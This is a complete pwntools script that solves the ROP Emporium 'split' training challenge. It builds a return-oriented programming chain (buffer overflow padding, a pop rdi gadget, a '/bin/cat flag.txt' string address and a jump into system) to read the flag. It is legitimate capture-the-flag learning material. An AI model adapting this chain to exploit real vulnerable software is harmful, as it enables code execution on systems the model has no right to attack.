#!/usr/bin/python3

# ROP Emporium - Split

from pwn import *
# context.log_level = 'debug'

executable = './split'
io = process(executable)
context.binary = binary = ELF(executable)
rop = ROP(binary)

offset = 0x28

payload = flat([
    b"A" * offset,                       # Offset = Buf + RBP
    rop.rdi.address,                     # pop rdi ; ret ;
    p64(0x00601060),                     # 0x00601060 is string `/bin/cat flag.txt`
    binary.symbols.usefulFunction + 9,   # Win function + 9 bytes = function `system`
])

io.recvuntil(b"> ")
io.sendline(payload)

# f = open('payload', 'wb')
# f.write(payload)
# f.close()
# exit()

# io.interactive()
# exit()

io.recvline()
success(io.recvline().decode())
exit()
